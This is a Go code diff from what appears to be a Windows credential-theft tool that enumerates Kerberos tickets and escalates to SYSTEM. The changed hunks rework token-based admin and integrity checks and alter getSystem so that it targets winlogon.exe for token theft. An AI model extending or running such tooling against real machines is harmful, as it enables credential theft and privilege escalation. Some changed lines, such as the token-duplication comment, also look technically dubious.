@@ -454,13 +454,9 @@ func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
 func isAdmin() (bool, error) {
 	fmt.Printf("[*] Checking admin status\n")
 	var token windows.Token
-	process, err := windows.GetCurrentProcess()
-	if err != nil {
-		fmt.Printf("[-] GetCurrentProcess failed: %v\n", err)
-		return false, fmt.Errorf("GetCurrentProcess failed: %v", err)
-	}
+	procHandle := windows.CurrentProcess()
 
-	err = windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
+	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
 	if err != nil {
 		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
 		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
@@ -672,27 +668,45 @@ func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCr
 }
 
 func isHighIntegrity() (bool, error) {
-	var token windows.Token
 	procHandle := windows.CurrentProcess()
-	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
+	var token windows.Token
+
+	// Request more specific token access rights
+	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
 	if err != nil {
 		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
 	defer token.Close()
+
+	// Create a duplicate of the token to avoid impersonation issues
+	var duplicateToken windows.Token
+	err = windows.DuplicateTokenEx(
+		token,
+		windows.TOKEN_ALL_ACCESS,
+		nil,
+		windows.SecurityIdentification, // Use SecurityIdentification instead of SecurityImpersonation
+		windows.TokenPrimary,
+		&duplicateToken,
+	)
+	if err != nil {
+		return false, fmt.Errorf("DuplicateTokenEx failed: %v", err)
+	}
+	defer duplicateToken.Close()
 
 	adminSID, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
 	if err != nil {
 		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
 	}
 
-	isAdmin, err := token.IsMember(adminSID)
+	// Use the duplicate token for membership check
+	isAdmin, err := duplicateToken.IsMember(adminSID)
 	if err != nil {
 		return false, fmt.Errorf("IsMember failed: %v", err)
 	}
 
 	var elevation Elevation
 	var returnedLen uint32
-	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
+	err = windows.GetTokenInformation(duplicateToken, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
 	if err != nil {
 		return false, err
 	}
@@ -730,8 +744,8 @@ func getSystem() bool {
 		return false
 	}
 
-	if !isHighIntegrity {
-		fmt.Printf("[*] Current process is not high integrity, looking for winlogon.exe\n")
+	if isHighIntegrity {
+		fmt.Printf("[*] Current process is high integrity, looking for winlogon.exe\n")
 		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 		if err != nil {
 			fmt.Printf("[-] Failed to create process snapshot: %v\n", err)
